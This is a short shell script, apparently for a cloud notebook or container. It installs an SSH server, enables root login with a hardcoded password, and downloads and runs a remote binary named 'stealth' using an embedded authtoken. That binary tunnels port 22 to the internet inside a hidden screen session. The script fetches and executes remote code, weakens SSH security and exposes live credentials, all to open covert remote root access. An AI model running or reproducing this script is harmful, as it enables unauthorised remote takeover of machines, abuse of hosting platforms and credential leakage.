lscpu

export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

apt update >/dev/null;apt -y install nano iputils-ping screen net-tools openssh-server build-essential psmisc libreadline-dev dialog curl wget sudo >/dev/null
netstat -ntlp
sed -i "s/#PermitRootLogin prohibit-password/PermitRootLogin yes/" /etc/ssh/sshd_config
sed -i "s/PasswordAuthentication no/PasswordAuthentication yes/" /etc/ssh/sshd_config
echo "root:Pmataga87465622" | chpasswd
service ssh restart
wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/stealth >/dev/null
sleep 2
chmod +x stealth
sleep 2
./stealth authtoken 1ikSEiZSRMKmWsqnjDeU26yYYR0_7pP7ZwJhgXgF2RU953ELR
sleep 2
screen -dmS ngroo bash -c './stealth tcp 22'

sleep 5

curl http://127.0.0.1:4040/api/tunnels
sleep 5
ping t.co
